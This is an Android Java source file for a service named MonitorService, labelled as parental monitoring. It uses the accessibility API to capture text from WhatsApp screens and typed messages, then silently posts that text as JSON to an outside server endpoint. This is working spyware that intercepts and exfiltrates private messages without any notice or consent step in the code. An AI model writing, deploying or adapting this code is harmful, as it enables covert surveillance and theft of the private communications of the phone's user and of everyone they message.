package com.example.parentalmonitor;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MonitorService extends AccessibilityService {

    private static final String SERVER_URL = "https://web-sederhana-production.up.railway.app/api/lapor-wa";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();
        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence packageName = event.getPackageName();
            CharSequence text = event.getText().toString();

            if (packageName != null && packageName.toString().contains("whatsapp")) {
                sendDataToServer("WhatsApp", text.toString());
            }
        }
    }

    private void sendDataToServer(final String kontak, final String pesan) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(SERVER_URL);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json; utf-8");
                    conn.setDoOutput(true);

                    String jsonInputString = "{\"kontak\": \"" + kontak + "\", \"pesan\": \"" + pesan.replace("\"", "") + "\"}";

                    try(OutputStream os = conn.getOutputStream()) {
                        byte[] input = jsonInputString.getBytes("utf-8");
                        os.write(input, 0, input.length);
                    }
                    conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception e) {
                    Log.e("MonitorService", "Gagal kirim data", e);
                }
            }
        }).start();
    }

    @Override
    public void onInterrupt() {}
}
